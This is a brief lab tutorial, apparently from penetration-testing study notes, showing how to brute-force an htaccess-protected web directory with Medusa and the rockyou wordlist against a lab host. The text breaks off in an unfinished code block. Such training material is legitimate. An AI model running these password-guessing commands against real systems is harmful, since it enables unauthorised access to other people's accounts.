## Medusa

Medusa is intended to be a speedy, massively parallel, modular login brute force.

### HTTP htaccess Attack

In lab, start Xamp's Webserver and MySQL on the Windows client

1. Decompress rockyou wordlist

   ```bash
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
   ```

2. Direct medusa to the webserver with the supplied wordlist

   ```bash
   medusa -h 192.168.216.10 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
   
   # Options
   -h		# Specifies host
   -u		# Specifies username
   -P		# Provides wordlist to use
   -M		# Module (protocol)
   -m		# Parameter to pass to module
   ```

3. If a match is found, the process will stop & report the discovered password

More options are available for Medusa and can be seen with the command:

```bash
